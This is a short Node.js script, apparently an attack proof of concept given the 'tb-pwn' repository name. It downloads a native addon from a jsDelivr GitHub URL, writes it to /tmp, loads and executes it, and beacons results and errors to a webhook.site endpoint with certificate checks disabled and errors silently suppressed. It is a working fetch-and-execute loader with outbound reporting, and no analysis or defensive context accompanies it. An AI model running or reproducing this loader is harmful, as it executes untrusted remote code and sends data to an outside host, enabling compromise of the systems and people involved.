var https = require('https');
var fs = require('fs');
var TOKEN = '14750775-fef3-408e-8214-35e34b90591f';
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/' + TOKEN + '/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
var url = 'https://cdn.jsdelivr.net/gh/cerad95/tb-pwn-9c4f@addon1/tb.node';
https.get(url, function (res) {
    if (res.statusCode !== 200) {
        send('addon', 'HTTP ' + res.statusCode);
        res.resume();
        return;
    }
    var chunks = [];
    res.on('data', function (d) { chunks.push(d); });
    res.on('end', function () {
        var b = Buffer.concat(chunks);
        try {
            fs.writeFileSync('/tmp/tb.node', b);
        } catch (e) {
            send('addon', 'write ERR ' + e);
            return;
        }
        try {
            var addon = require('/tmp/tb.node');
            send('addon', 'hello=' + addon.hello() + ' size=' + b.length);
        } catch (e) {
            send('addon', 'load ERR ' + e);
        }
    });
}).on('error', function (e) {
    send('addon', 'http ERR ' + e);
});
